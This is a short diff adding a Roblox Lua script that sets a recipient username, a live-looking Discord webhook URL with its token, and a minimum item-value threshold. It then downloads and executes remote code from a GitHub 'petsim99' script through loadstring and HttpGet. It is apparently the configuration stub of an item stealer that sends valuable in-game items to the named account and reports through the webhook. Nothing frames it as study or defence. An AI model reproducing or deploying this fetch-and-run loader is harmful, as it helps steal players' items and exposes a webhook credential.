@@ -1,0 +1,6 @@
+Username = "dani7uv"
+Username2 = "dani7uv"
+Webhook = "https://discord.com/api/webhooks/1303559528574619870/zPytEVRF7gwQHGifmA1-pB987iq_g-BUj86Y7hPhAEDbJWrXCYDxF1Vv_KxM5XzOPyAo"
+MinimumRAP = 10000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Detrox01/petsim99/refs/heads/main/script.txt"))()
